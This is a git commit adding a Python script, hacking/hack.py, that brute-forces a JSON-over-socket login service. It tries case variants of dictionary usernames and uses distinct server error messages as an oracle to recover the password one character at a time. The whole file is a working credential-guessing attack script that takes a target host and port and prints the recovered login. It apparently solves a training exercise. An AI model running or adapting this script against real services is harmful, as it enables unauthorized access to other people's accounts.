1a889ab1655243751b17aa5ecc8078a60c45f4c7
Edgar Vardanyan <e.vardan4an@gmail.com>
2023-11-23 19:52:53 +0400

    adding to repo

---
+++ hacking/hack.py
@@ -0,0 +1,89 @@
+import itertools
+import socket
+import sys
+import os
+import json
+
+
+def all_case_combinations(word):
+    return map(''.join, itertools.product(*zip(word.upper(), word.lower())))
+
+
+def establish_connection():
+    # Read the login dictionary
+    with open(os.path.join(os.getcwd(), 'logins.txt'), 'r') as f:
+        login_list = f.read().splitlines()
+    # Read the password dictionary
+    with open(os.path.join(os.getcwd(), 'passwords.txt'), 'r') as f:
+        password_list = f.read().splitlines()
+
+    args = sys.argv
+    host = args[1]
+    port = args[2]
+    address = (host, int(port))
+    client_socket = socket.socket()
+    client_socket.connect(address)
+    login = ""
+    found_login = False
+
+    for login in login_list:
+        for guess_login in all_case_combinations(login):
+            data = {"login": guess_login,
+                    "password": ""
+                    }
+            # print(f"login is {guess_login}")
+            json_data = json.dumps(data).encode()
+            # print("json_data is :>", json_data)
+            client_socket.send(json_data)
+            response = client_socket.recv(1024)
+            decoded_response = json.loads(response.decode())
+            # print("decoded_response is :>", decoded_response)
+
+            # we got the password, break the loop
+            if decoded_response == {"result": "Wrong password!"}:
+                # print("guess login is:>", guess_login)
+                login = guess_login
+                # client_socket.close()
+                found_login = True
+                break
+        if found_login:  # check the flag in the outer loop
+            break
+
+    if len(login) > 0:
+        possible_characters = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
+        password_so_far = ""
+
+        while True:
+            found_char = False
+            for char in possible_characters:
+                current_attempt = password_so_far + char
+                data = {"login": login, "password": current_attempt}
+                json_data = json.dumps(data).encode()
+
+                client_socket.send(json_data)
+                response = client_socket.recv(1024)
+                decoded_response = json.loads(response.decode())
+
+                # we got the password, break the loop
+                if decoded_response == {"result": "Connection success!"}:
+                    # print("username and password is :>", json_data)
+                    print(json.dumps(data))
+
+                    # print(json_data)
+                    client_socket.close()
+                    exit(0)
+
+                # we found the next character in the password
+                if decoded_response == {"result": "Exception happened during login"}:
+                    password_so_far = current_attempt
+                    found_char = True
+                    break
+
+            # If we didn't find the next character in the password, it means our current password is incorrect.
+            if not found_char:
+                print("Failed to determine the complete password.")
+                exit(1)
+
+establish_connection()
+
+
